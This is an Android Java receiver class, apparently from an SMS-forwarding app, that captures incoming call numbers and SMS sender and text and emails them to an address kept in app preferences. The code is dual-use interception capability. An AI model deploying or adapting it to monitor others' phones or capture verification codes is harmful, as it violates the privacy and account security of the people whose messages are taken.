package com.example.admin.smssender;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Created by admin on 8/24/2019.
 */

public class Interceptor extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("pref_1",Context.MODE_PRIVATE);
        final String email = prefs.getString("usermail",null);
        System.out.println(email);
        Log.v("SUCCESS","Detected by receiver!!!");
        if(intent.getAction().equals("android.intent.action.PHONE_STATE")){


                    String State = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            final String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if(State.equals(TelephonyManager.EXTRA_STATE_RINGING)){
                System.out.println(incomingNumber);
                //Sends the message to the user
                try {
                    Log.v("SUCCESS","reached InterceptCall");
                    Thread mailThread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            System.out.println("Running the thread!!!");
                            MailUtil mailUtil = new MailUtil(email);
                            if(incomingNumber != null) {
                                mailUtil.Start_Mail_for_call(incomingNumber);
                            }
                        }
                    });
                    //Starting the mail thread
                    System.out.println("Thread starting now !!!");
                    mailThread.start();


                }catch (Exception e)
                {
                    System.err.println("Message: " + e.getMessage());
                    System.err.println("Caused by:" + e.getCause());
                    System.out.println("failed to send mail!!!");
                    e.printStackTrace();
                }
            }
        }
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Log.v("SUCCESS","Entered inside intent for sms");
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String msg_from;
            if(bundle !=null){
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i< msgs.length; i++) {
                        msgs[i]=SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        final String message= "\nFrom :  " + msg_from + "\n--------\nMessage Content: \n" + msgBody;
                        Log.v("SUCCESS", message);

                        Thread mailThread = new Thread(new Runnable() {
                            @Override
                            public void run() {
                                System.out.println("Running the SMS Notifying mail thread!!!");
                                MailUtil mailUtil = new MailUtil(email);
                                mailUtil.Start_Mail_for_msg(message);
                            }
                        });
                        //Starting the mail thread
                        System.out.println("Thread starting now !!!");
                        mailThread.start();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
